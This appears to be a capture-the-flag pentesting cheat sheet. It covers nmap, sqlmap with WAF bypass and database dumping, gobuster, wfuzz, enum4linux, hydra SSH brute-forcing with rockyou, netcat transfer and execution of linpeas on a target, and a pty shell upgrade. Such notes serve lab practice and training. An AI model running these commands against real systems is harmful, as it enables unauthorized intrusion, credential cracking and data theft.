# Resources
* [Interactive Shells](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys)
* [SUID Binaries](https://gtfobins.github.io/)
* [Linux Priv Escalation Guide](https://payatu.com/guide-linux-privilege-escalation)

# NMAP
```
mkdir nmap
nmap -sC -sV -oN nmap/initial $IP
```
* `-sT` - Connect scan, does three-way handshake, sends more packets, easier to detect
* `-sS` - SYN scan, faster, bails on three-way handshake
* `-sC` - Use default script
* `-sV` - Probe open ports to determine service/version info
* `-oN` - Output scan in normal mode
* `-T<1-5>` - Level of aggression to be used. Anti-mappers often detect `T3`-`T5`

## NMAP SCripts
A recent addition to Nmap is the Nmap Scripting Engine or NSE for short. This
feature introduces a "plug-in" nature to Nmap, where scripts can be used to
automate various actions such as:

* Exploitation
* Fuzzing
* Bruteforcing

At the time of writing, the NSE comes with 603 scripts, which can be found [here](https://nmap.org/nsedoc/scripts/).
```
nmap --script ftp-proftpd-backdoor -p 21 <ip_address>
```
**NOTE that SNORT can be used to detect nmap**

# sqlmap
When you see a login form, the first thing you should check is for sql injections. This is
an automated tool for that.
```
sqlmap -u "http://$IP/administrator.php" --forms -a
```
* `-u` - Specifies which url to attack
* `--forms` - Automatically selects parameters from the `<form>` elements on the page
* `--dump` - Used to retreive data from the DB once sqli is found
* `-a` - Grabs just about everything from the DB
* `--tamper=space2comment` - Bypas Web App Firewall (WAF)

## Sample commands
```
sqlmap -r ~/Downloads/filename --tamper=space2comment --dump-all --dbms sqlite
```

# Gobuster
Logically speaking, there are many pieces to a website that the average user doesn't see.
They can be anything from a sitemap to a secret directory which contains important files.
Unfortunately, this can cause developers to get a bit lazy, and not protect these
directories, allowing anyone who finds out that they exist to steal the important data.
gobuster is the tool that helps us discover these valuable directories if they exist. The
idea behind the tool itself is simple, bruteforcing common paths to check if it's valid.
Similar to how you would in your browser, albeit this tool is much, much quicker.
Gobuster has three modes: dir, vhost and dns.

Let's use the table below to illustrate how wordlists work:

|Original URL 	              |Item in Wordlist 	|Final URL                       |
|-----------------------------|-------------------|--------------------------------|
|http://example.com 	        |backups 	          |http://example.com/backups      |
|http://loveucmnatic.thm 	    |shepards 	        |http://loveucmnatic.thm/shepards|

Now the gobuster options:
Options 	Description
-u 	      Used to specify which url to enumerate
-w 	      Used to specify which wordlist that is appended on the url path i.e
          "http://url.com/word1"
          "http://url.com/word2"
          "http://url.com/word3.php"
-x 	      Used to specify file extensions i.e "php,txt,html"

```
export WORDLIST=/opt/directory-list-2.3-medium.txt
gobuster dir -u "http://$IP" -w $WORDLIST | tee gobuster.log
```

# enum4linux
```
/opt/enum4linx/enum4linx.pl -a $IP | tee enum4linux.log
```

# hyra
For finding passwords
```
hydra -l jan -P /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt ssh://$IP
```

# linpeas!
target terminal:
```
nc -l -p 1234 > /tmp/jake &
```

my terminal:
```
nc $IP $PORT < linpeas.sh
```

Finally, run:
```
chmod +x /tmp/jake
/tmp/jake
```

# wfuzz
The premise behind wfuzz is simple. Occasionally you want a bit more information about
how much data something within a web application returns. This could be anything from a
file, a response code (i.e. 404 meaning the URL doesn't exist) or the parameters used
in a form similar to the form you attacked in Day 2.

Options 	Description
-c 	Shows the output in color
-d 	Specify the parameters you want to fuzz with, where the data is encoded for a HTML form
-z 	Specifies what will replace FUZZ in the request. For example -z file,big.txt. We're telling wfuzz to look for files by replacing "FUZZ" with the words within "big.txt"
--hc 	Don't show certain http response codes. I.e. Don't show 404 responses that indicate the file doesn't exist, or "200" to indicate the file does exist
--hl 	Don't show for a certain amount of lines in the response
--hh 	Don't show for a certain amount of words
Note how the "FUZZ" parameter is being replaced with the words from the wordlist.
```
wfuzz -c -z file,mywordlist.txt -d “username=FUZZ&password=FUZZ” -u http://shibes.thm/login.php
```



# Stablize Shells
```
python -c 'import pty; pty.spawn("/bin/bash")'
```


